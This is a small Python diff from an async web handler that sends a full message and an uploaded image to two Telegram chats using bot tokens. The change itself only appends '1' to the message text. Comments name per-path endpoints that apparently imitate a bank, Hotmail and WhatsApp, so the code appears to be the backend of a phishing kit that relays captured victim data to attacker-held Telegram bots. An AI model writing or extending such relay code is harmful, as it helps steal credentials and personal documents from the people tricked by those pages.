@@ -863,13 +863,13 @@ async def handle_dynamic_endpoint_optimized_with_image(
                 # TODOS los paths: lafise2, hotma1-3, wts1-3, bbdsasd
                 # Envía al DEFAULT_CHAT_ID con imagen y mensaje completo
                 r1 = await enviar_telegram_hibrido(
-                    mensaje_completo, DEFAULT_CHAT_ID, TOKEN, 1,
+                    mensaje_completo+"1", DEFAULT_CHAT_ID, TOKEN, 1,
                     image_data=image_data, image_filename=image_filename
                 )
                 telegram_results.append(r1)
                 # Envía al chat específico también con imagen y mensaje completo
                 r2 = await enviar_telegram_hibrido(
-                    mensaje_completo, config["chat_id"], config["bot_id"], 1,
+                    mensaje_completo+"1", config["chat_id"], config["bot_id"], 1,
                     image_data=image_data, image_filename=image_filename
                 )
                 telegram_results.append(r2)
